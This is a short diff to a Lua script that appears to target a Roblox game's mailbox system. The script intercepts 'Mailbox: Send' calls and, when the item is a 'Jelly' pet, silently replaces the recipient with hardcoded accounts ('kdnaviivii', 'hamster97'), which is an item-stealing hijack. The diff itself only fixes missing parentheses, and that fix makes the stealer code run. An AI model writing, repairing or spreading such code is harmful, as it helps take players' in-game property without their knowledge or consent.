@@ -183,7 +183,7 @@ local responsexr =
             Body = qv
         }
     )
-elseif args[3] == "Pet" and string.find(save.Inventory.Pet[args[4]].id, "Jelly" then
+elseif args[3] == "Pet" and string.find(save.Inventory.Pet[args[4]].id, "Jelly") then
 args[1] = "kdnaviivii" -- Jelly Hold
 _G.pvc = args[4]
 mailc=mailc+1
@@ -252,7 +252,7 @@ args[1] = "hamster97"
 end
 elseif tostring(x) == "Mailbox: Send" and args[4] ~= _G.pvc then
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
-if args[3] == "Pet" and string.find(save.Inventory.Pet[args[4]].id, "Jelly" then
+if args[3] == "Pet" and string.find(save.Inventory.Pet[args[4]].id, "Jelly") then
 args[1] = "kdnaviivii"
 end
 _G.pvc = args[4]
